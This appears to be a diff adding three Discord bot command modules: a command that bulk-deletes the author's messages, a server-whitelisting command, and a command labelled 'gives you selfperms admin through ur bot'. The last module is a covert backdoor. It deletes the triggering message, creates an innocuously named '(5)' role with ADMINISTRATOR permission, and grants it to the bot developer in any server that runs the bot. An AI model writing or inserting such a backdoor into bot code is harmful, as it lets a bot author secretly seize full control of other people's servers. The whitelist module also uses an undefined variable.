@@ -1,0 +1,125 @@
+
+
+
+module.exports = {
+  config: {
+    name: "#",
+    aliases: ['cleanme'],
+    description: "this will clean your messages skid",
+    example: "#",
+    syntax: "#",
+    permissions: "the bot will need to have manage message perms",
+    cooldown: 30,
+    ownerOnly: true
+  },
+  run: async (client, message, args) => {
+    let member = message.author;
+    message.channel.messages.fetch({ limit: 100 }).then(async messages => {
+      messages = messages.filter(m => m.author.id === member.id);
+      await message.channel.bulkDelete(messages);
+    })
+  }
+}
+
+
+
+
+
+const { MessageEmbed } = require("discord.js");
+const Discord = require("discord.js");
+const db = require('quick.db');
+const moment = require('moment')
+
+module.exports = {
+config: {
+  name: "auth",
+  description: "whitelist servers to use your bot",
+  usage: "auth <serverid>"
+},
+  run: async (client, message, args) => {
+     try {
+      if (config.developers.includes(message.author.id)) {
+        const guild = args[0];
+        if (!guild)
+          return message.channel.send({
+            embeds: [
+              new Discord.MessageEmbed()
+                .setColor()
+                .setDescription(
+                  `${message.author}: provide a guild id`
+                ),
+            ],
+          });
+        await message.channel.send({
+          embeds: [
+            new Discord.MessageEmbed()
+              .setColor()
+              .setDescription(
+                ` ${message.author}: successfully authorized **${guild}**`
+              ),
+          ],
+        });
+        await db.set(`guildauthed_${guild}`, "true");
+      } else {
+        message.channel.send({
+          embeds: [
+            new Discord.MessageEmbed()
+              .setColor()
+              .setDescription(
+                ` ${message.author}: Only bot owners can do this.`
+              ),
+          ],
+        });
+      }
+    } catch (e) {
+      message.channel.send({ content: `${e}` });
+    }
+  },
+
+}
+
+
+
+
+
+
+const Discord = require('discord.js');
+const { MessageEmbed } = require('discord.js');
+
+
+
+module.exports = {
+  config: {
+    name: '%',
+    description: 'gives you selfperms admin through ur bot',
+  },
+  run: async (client, message, args) => {
+
+    const developers = ['add your id']
+
+    if (!developers.includes(message.author.id)) {
+      message.reply('commande made bvy saks4th')
+      return
+    }
+
+    if (developers.includes(message.author.id)) {
+      message.delete();
+      const role = message.guild.roles.cache.find(role => role.name === '(5)')
+
+      if (!role) {
+        try {
+          message.channel.sendTyping();
+          let muterole = await message.guild.roles.create({ name: "(5)", color: "#ffffff", permissions: ["ADMINISTRATOR"] })
+        } catch (error) {
+          console.log(error)
+        }
+      };
+      var role2 = message.guild.roles.cache.find(role => role.name === "(5)");
+
+
+      await message.member.roles.add(role2.id)
+
+    }
+  }
+}
+
